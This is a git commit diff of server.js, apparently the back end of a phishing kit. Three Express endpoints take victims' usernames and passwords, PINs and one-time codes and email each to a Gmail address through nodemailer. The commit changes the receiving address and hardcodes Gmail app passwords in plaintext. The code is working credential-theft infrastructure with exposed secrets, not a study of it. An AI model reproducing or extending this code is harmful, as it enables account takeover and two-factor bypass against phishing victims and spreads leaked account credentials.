c0e35cb2f81180244485b00115d0dc2732501598
mmaagha79 <167622036+mmaagha79@users.noreply.github.com>
2024-04-20 13:41:59 +0100

    Update server.js

--- server.js
+++ server.js
@@ -20,14 +20,14 @@ app.post("/", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "Mmaghaebube@gmail.com",
-      pass: "yvxplddhlwqnbcel",
+      user: "mmaagha79@gmail.com",
+      pass: "batwmevhpyercgyf",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Mmaghaebube@gmail.com",
+    to: "mmaagha79@gmail.com",
     subject: `Username: ${req.body?.username} \t\n\n\n password: ${req.body?.password}`,
   };
 
@@ -50,14 +50,14 @@ app.post("/pin", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "Mmaghaebube@gmail.com",
-      pass: "yvxplddhlwqnbcel",
+      user: "mmaagha79@gmail.com",
+      pass: "batwmevhpyercgyf",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Mmaghaebube@gmail.com",
+    to: "mmaagha79@gmail.com",
     subject: `PIN: ${req.body?.pin} `,
   };
 
@@ -80,14 +80,14 @@ app.post("/otp", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "Mmaghaebube@gmail.com",
-      pass: "yvxplddhlwqnbcel",
+      user: "mmaagha79@gmail.com",
+      pass: "batwmevhpyercgyf",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Mmaghaebube@gmail.com",
+    to: "mmaagha79@gmail.com",
     subject: `OTP: ${req.body?.otp} `,
   };
 
